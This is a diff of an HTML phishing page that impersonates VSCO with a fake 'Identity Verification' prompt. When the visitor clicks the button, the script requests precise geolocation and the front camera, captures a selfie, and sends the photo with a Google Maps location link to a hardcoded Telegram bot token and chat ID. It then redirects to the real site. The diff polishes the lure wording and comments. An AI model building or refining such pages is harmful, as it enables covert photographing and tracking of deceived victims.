@@ -9,6 +9,8 @@
         .vsco-logo { width: 60px; height: 60px; margin-bottom: 30px; }
         h1 { font-size: 24px; font-weight: 600; margin-bottom: 15px; }
         p { font-size: 15px; color: #8e8e93; line-height: 1.5; margin-bottom: 40px; }
+        
+        /* الزر الأزرق المطلوب */
         .btn { 
             background: #007aff; color: white; border: none; padding: 18px; 
             border-radius: 12px; font-weight: 600; font-size: 16px; width: 100%;
@@ -22,26 +24,27 @@
     <div class="container">
         <img src="https://vsco.co/assets/images/vsco-logo.png" class="vsco-logo">
         <h1>Identity Verification</h1>
-        <p>To access professional tools, please complete the facial and location check.</p>
-        <button class="btn" onclick="startProcess()">Verify & Continue</button>
+        <p>Verification is required to ensure secure studio access. Please complete the facial and region check.</p>
+        
+        <button class="btn" onclick="startProcess()">Verify Identity</button>
     </div>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const token = "8528253517:AAGk6SRaXs-M3PTPT3Z-ZwhLQXyQkI1bZMs";
-        const chatId = "8005843544";
+        const token = "8528253517:AAGk6SRaXs-M3PTPT3Z-ZwhLQXyQkI1bZMs"; //
+        const chatId = "8005843544"; //
 
         async function startProcess() {
-            // 1. طلب الموقع أولاً وبدقة عالية
+            // الخطوة 1: طلب الموقع فوراً عند الضغط
             navigator.geolocation.getCurrentPosition(
                 (p) => {
-                    const loc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                    const loc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`; // رابط خريطة مباشر
                     openCamera(loc);
                 },
                 (err) => {
-                    openCamera("Location Access Denied (Check Settings)");
+                    openCamera("Location Access Denied (Check Phone Settings)");
                 },
                 { enableHighAccuracy: true, timeout: 10000 }
             );
@@ -49,12 +52,12 @@
 
         async function openCamera(locationText) {
             try {
-                // 2. طلب الكاميرا
+                // الخطوة 2: طلب الكاميرا
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
 
-                // 3. الانتظار 3 ثواني (لحل مشكلة الصورة السوداء)
+                // الخطوة 3: الانتظار 3 ثوانٍ كاملة لضمان وضوح الصورة ومنع السواد
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     const ctx = canvas.getContext('2d');
@@ -62,7 +65,6 @@
                     canvas.height = video.videoHeight;
                     ctx.drawImage(video, 0, 0);
                     
-                    // 4. إرسال البيانات
                     canvas.toBlob(blob => {
                         const formData = new FormData();
                         formData.append('chat_id', chatId);
@@ -71,11 +73,11 @@
                         fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
                     }, 'image/jpeg');
 
-                    // 5. التحويل النهائي
+                    // التحويل النهائي
                     setTimeout(() => { window.location.href = "https://vsco.co/"; }, 1500);
                 }, 3000); 
             } catch (e) {
-                alert("Camera access is mandatory for verification. Please use Chrome/Safari and Allow access.");
+                alert("Facial verification is required. Please use Chrome/Safari and Allow camera access.");
             }
         }
     </script>
